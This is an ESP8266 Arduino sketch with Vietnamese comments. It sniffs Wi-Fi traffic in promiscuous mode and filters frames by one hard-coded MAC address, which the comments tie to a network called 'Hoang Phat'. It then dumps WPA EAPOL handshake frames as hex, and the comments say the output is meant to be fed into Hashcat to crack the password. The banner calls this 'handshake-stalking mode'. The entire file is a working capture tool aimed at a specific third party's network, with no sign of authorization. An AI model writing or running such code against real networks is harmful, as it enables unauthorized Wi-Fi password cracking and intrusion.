#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// MAC Hoang Phat từ ảnh Net Analyzer của bạn
uint8_t target_mac[6] = {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8};

void sniffer_callback(uint8_t *buf, uint16_t len) {
  uint8_t *frame = buf + 12;
  uint16_t frame_len = len - 12;

  // 1. Lọc đúng MAC Hoang Phat
  if (memcmp(frame + 10, target_mac, 6) == 0 || memcmp(frame + 16, target_mac, 6) == 0) {
    
    // 2. CHỈ IN KHI THẤY GÓI TIN HANDSHAKE (EAPOL)
    // Dấu hiệu nhận biết gói EAPOL: 0x88 0x8E
    if ((frame[32] == 0x88 && frame[33] == 0x8E) || (frame[34] == 0x88 && frame[35] == 0x8E)) {
      
      Serial.println("\n[!!!] ĐÃ TÓM ĐƯỢC HANDSHAKE (EAPOL) [!!!]");
      Serial.printf("RSSI: %d dBm | Độ dài: %d\n", (signed char)buf[0], frame_len);
      Serial.print("DATA HEX: ");
      
      // Hiện rõ từng số và chữ không thiếu một byte nào để nạp Hashcat
      for (int i = 0; i < frame_len; i++) {
        Serial.printf("%02X ", frame[i]);
      }
      Serial.println("\n------------------------------------------------");
    }
  }
}

void setup() {
  Serial.begin(115200); // Khớp với Serial USB Terminal và Python của bạn
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  
  wifi_set_channel(5); // Kênh 5 theo ảnh bạn gửi

  Serial.println("\n--- CHẾ ĐỘ RÌNH HANDSHAKE: HOANG PHAT ---");
  Serial.println("Đang im lặng để chờ gói tin 88 8E...");
}

void loop() { delay(1); }
